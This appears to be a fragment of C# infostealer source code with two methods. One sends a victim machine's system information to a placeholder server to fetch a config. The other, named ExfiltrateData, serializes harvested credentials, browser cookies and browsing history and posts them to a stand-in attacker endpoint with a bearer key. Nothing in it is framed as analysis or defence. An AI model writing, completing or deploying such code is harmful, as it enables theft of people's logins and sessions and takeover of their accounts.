static async Task<Config> GetConfigFromServer(SystemInfo systemInfo)
{
    using (HttpClient client = new HttpClient())
    {
        string apiUrl = "https://yourserver.com/config";
        string jsonData = JsonSerializer.Serialize(systemInfo);
        StringContent content = new StringContent(jsonData, Encoding.UTF8, "application/json");

        // Add authentication key to the request header
        client.DefaultRequestHeaders.Authorization = new AuthenticationHeaderValue("Bearer", "your_secret_auth_key");

        HttpResponseMessage response = await client.PostAsync(apiUrl, content);
        response.EnsureSuccessStatusCode();  // Throw an exception for HTTP error responses
        string responseString = await response.Content.ReadAsStringAsync();

        return JsonSerializer.Deserialize<Config>(responseString);
    }
}

static async Task ExfiltrateData(List<Credential> credentials, List<Cookie> cookies, List<HistoryEntry> history)
{
    using (HttpClient client = new HttpClient())
    {
        string apiUrl = "https://yourserver.com/api";
        var data = new
        {
            Credentials = credentials,
            Cookies = cookies,
            History = history
        };
        string jsonData = JsonSerializer.Serialize(data);
        StringContent content = new StringContent(jsonData, Encoding.UTF8, "application/json");

        // Add authentication key to the request header
        client.DefaultRequestHeaders.Authorization = new AuthenticationHeaderValue("Bearer", "your_secret_auth_key");

        HttpResponseMessage response = await client.PostAsync(apiUrl, content);
        response.EnsureSuccessStatusCode();  // Throw an exception for HTTP error responses
        string responseString = await response.Content.ReadAsStringAsync();

        Console.WriteLine("Exfiltration Response: " + responseString);
    }
}
